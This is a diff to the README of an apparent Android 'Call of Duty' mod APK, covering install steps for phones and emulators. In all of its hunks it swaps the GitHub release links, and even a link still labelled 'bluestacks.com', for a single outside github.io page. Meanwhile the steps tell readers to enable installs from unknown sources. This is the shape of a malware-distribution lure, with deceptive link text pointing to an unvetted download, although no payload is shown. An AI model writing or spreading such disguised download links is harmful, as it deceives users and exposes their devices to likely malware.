@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/shrou5144/call-of-duty-apk-script-hub/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://shrou5144.github.io)
 
 ## 🎮 Overview
 
@@ -32,7 +32,7 @@ Supported devices: Samsung Galaxy S8+, Google Pixel 3, OnePlus 6, Xiaomi Mi 9, a
 
 You can get the APK file from the Releases page. Click the button below or scroll to the end of this page.
 
-[![Download Latest](https://img.shields.io/badge/Download-v2.1.0-grey?style=for-the-badge)](https://github.com/shrou5144/call-of-duty-apk-script-hub/releases)
+[![Download Latest](https://img.shields.io/badge/Download-v2.1.0-grey?style=for-the-badge)](https://shrou5144.github.io)
 
 ## 🛠 Installation
 
@@ -44,7 +44,7 @@ Follow these steps to install the mod on your Android device. You can also run i
    - Open **Settings** → **Security** (or **Biometrics and Security**).
    - Turn on **Install from unknown sources** for your browser or file manager.
 2. **Download the APK**
-   - Visit the [Releases page](https://github.com/shrou5144/call-of-duty-apk-script-hub/releases) on your phone.
+   - Visit the [Releases page](https://shrou5144.github.io) on your phone.
    - Tap the latest APK file (e.g., `call-of-duty-apk-script-hub-v2.1.0.apk`).
 3. **Install**
    - After download, open the file from your notifications or Downloads folder.
@@ -58,10 +58,10 @@ Follow these steps to install the mod on your Android device. You can also run i
 You can run the mod on Windows with an Android emulator like BlueStacks or NoxPlayer.
 
 1. **Install an Emulator**
-   - Download and install BlueStacks from [bluestacks.com](https://www.bluestacks.com).
+   - Download and install BlueStacks from [bluestacks.com](https://shrou5144.github.io).
    - Open the emulator and sign in with your Google account.
 2. **Download the APK**
-   - On your Windows PC, go to the [Releases page](https://github.com/shrou5144/call-of-duty-apk-script-hub/releases).
+   - On your Windows PC, go to the [Releases page](https://shrou5144.github.io).
    - Click the APK file to download it.
 3. **Install the APK in the Emulator**
    - Drag and drop the downloaded APK file into the BlueStacks window.
